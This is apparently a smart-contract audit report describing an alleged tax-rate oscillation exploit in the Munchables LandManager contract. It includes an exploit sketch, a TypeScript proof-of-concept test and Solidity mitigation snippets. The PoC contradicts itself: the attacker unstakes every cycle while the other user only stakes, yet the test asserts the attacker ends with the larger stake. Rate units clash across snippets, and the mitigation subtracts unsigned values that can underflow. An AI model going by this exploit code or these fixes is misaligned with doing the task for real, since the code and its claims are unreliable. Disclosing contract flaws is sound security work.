# Vulnerability details

## Impact
The "Oscillating Tax Rate Trap" exploit allows malicious landlords to manipulate the tax rate system in the LandManager contract to their advantage. By rapidly alternating between low and high tax rates, attackers can stake their assets artificially low rates while forcing other users to stake at high rates. This leads to multiple severe consequences:

1. Unfair Advantage: Attackers can accumulate more rewards or pay less taxes than honest users.
2. Economic Imbalance: The exploit disrupts the intended economic model of the system, potentially leading to hyperinflation or devaluation of in-game assets.
3. User Trust Erosion: As users become aware of the manipulation, they may lose trust in the system's fairness, potentially leading to a mass exodus.
4. System Instability: Rapid tax rate changes can cause unpredictable behavior in other parts of the ecosystem that rely on stable tax rates.
5. Financial Losses: Honest users who stake during manipulated high-tax periods will incur unnecessary losses.
6. TaxRateChanged event emission spam: Consistent event emission spam can introduce issues such as increasing operational costs, network congestion, and data storage impact. 

This issue has been classified as High Impact because it compromises the fundamental economic mechanisms of the platform. It effectively renders the tax system ineffective, enabling malicious users of the Munchables protocol to exploit the system to their advantage, disadvantaging honest participants.

## Proof of Concept
The vulnerability stems from the ability to change tax rates without any cooldown period. Here's a simplified proof of concept to showcase how the attacker may go about exploiting the protocol. A larger POC is placed below this. 

```typescript
// Assume `updateTaxRate`, `stakeMunchable`, and `unstakeMunchable` are functions in the LandManager contract

// Attacker's sequence
await landManager.updateTaxRate(1); // Set minimum tax rate
await landManager.stakeMunchable(largeAmount);
await landManager.updateTaxRate(99); // Set maximum tax rate
await landManager.unstakeMunchable(largeAmount);

// Honest user's interaction (happens around the same time)
await landManager.stakeMunchable(amount); // Likely to be at the high tax rate
```
Here is the larger POC to be placed into Typescript test suite for test-managers-updateTaxRate.test.ts
This test does the following:
Sets up two players: Alice (the attacker) and Bob (a normal user).
Alice locks some land to become a landlord.

Simulates multiple cycles of the "Oscillating Tax Rate Trap":
Alice sets a low tax rate.
Alice stakes during the low tax rate.
Alice immediately sets a high tax rate.
Bob stakes during the high tax rate (simulating a normal user's behavior).
Alice unstakes during the high tax rate.

After several cycles, it checks the results:
Print out the total stakes for Alice and Bob.
Prints the current tax rate.
Asserts that Alice's stake is higher than Bob's, demonstrating the advantage gained through the exploit.
Asserts that the final tax rate is high, showing how normal users are left with unfavorable conditions.

This test demonstrates how an attacker could manipulate the tax rate system to their advantage, staking at low rates and leaving other users with high rates. It highlights the need for a cooldown period or other mechanisms to prevent rapid tax rate changes.

```typescript
describe("LandManager: updateTaxRate", () => {
  // ... (previous code remains the same)

  describe("Oscillating Tax Rate Trap exploit", () => {
    const lowTaxRate = 1e16; // 1%
    const highTaxRate = 99e16; // 99%
    const stakingAmount = parseEther("1");

    beforeEach(async () => {
      // Register players
      await registerPlayer({ account: alice, testContracts });
      await registerPlayer({ account: bob, testContracts });

      // Alice (attacker) locks some land
      const { request: lockRequest } = await testContracts.lockManager.contract.simulate.lock(
        [zeroAddress, parseEther("10")],
        { account: alice, value: parseEther("10") }
      );
      await testClient.writeContract(lockRequest);
    });

    it("demonstrates the oscillating tax rate trap", async () => {
      // Simulate rapid tax rate changes
      for (let i = 0; i < 5; i++) {
        // Set low tax rate
        const { request: lowTaxRequest } = await testContracts.landManagerProxy.contract.simulate.updateTaxRate([lowTaxRate], {
          account: alice,
        });
        await testClient.writeContract(lowTaxRequest);

        // Alice stakes during low tax rate
        const { request: aliceStakeRequest } = await testContracts.landManagerProxy.contract.simulate.stakeMunchable([stakingAmount], {
          account: alice,
        });
        await testClient.writeContract(aliceStakeRequest);

        // Set high tax rate
        const { request: highTaxRequest } = await testContracts.landManagerProxy.contract.simulate.updateTaxRate([highTaxRate], {
          account: alice,
        });
        await testClient.writeContract(highTaxRequest);

        // Bob stakes during high tax rate (simulating a normal user)
        const { request: bobStakeRequest } = await testContracts.landManagerProxy.contract.simulate.stakeMunchable([stakingAmount], {
          account: bob,
        });
        await testClient.writeContract(bobStakeRequest);

        // Alice unstakes during high tax rate
        const { request: aliceUnstakeRequest } = await testContracts.landManagerProxy.contract.simulate.unstakeMunchable([stakingAmount], {
          account: alice,
        });
        await testClient.writeContract(aliceUnstakeRequest);
      }

      // Check the results
      const aliceStake = await testContracts.landManagerProxy.contract.read.stakedMunchables([alice]);
      const bobStake = await testContracts.landManagerProxy.contract.read.stakedMunchables([bob]);
      const currentTaxRate = await testContracts.landManagerProxy.contract.read.getTaxRate();

      console.log("Alice's total stake:", aliceStake.toString());
      console.log("Bob's total stake:", bobStake.toString());
      console.log("Current tax rate:", currentTaxRate.toString());

      // Assert that Alice's stake is higher than Bob's due to the exploit
      assert(aliceStake > bobStake, "Alice's stake should be higher than Bob's due to the exploit");

      // Assert that the final tax rate is high
      assert(currentTaxRate.toString() === highTaxRate.toString(), "Final tax rate should be high");
    });
  });
});
```

## Recommended Mitigation Steps

Implementation of a cooldown period using block.timestamp, an example of this is shown below! 

```solidity
uint256 public constant TAX_RATE_COOLDOWN = 1 days;
uint256 public lastTaxRateUpdate;

function updateTaxRate(uint256 newRate) external {
    require(block.timestamp >= lastTaxRateUpdate + TAX_RATE_COOLDOWN, "Cooldown period not elapsed");
    // ... rest of the function
    lastTaxRateUpdate = block.timestamp;
}
``` 
Or if the protocol wanted to implement a mechanism that allows the tax rate to only change up to a certain percentage they would implement a solution like the following.

```solidity
uint256 public constant MAX_RATE_CHANGE = 5; // 5% maximum change

function updateTaxRate(uint256 newRate) external {
    uint256 currentRate = getTaxRate();
    require(abs(newRate - currentRate) <= MAX_RATE_CHANGE, "Rate change too large");
    // ... rest of the function
}
```
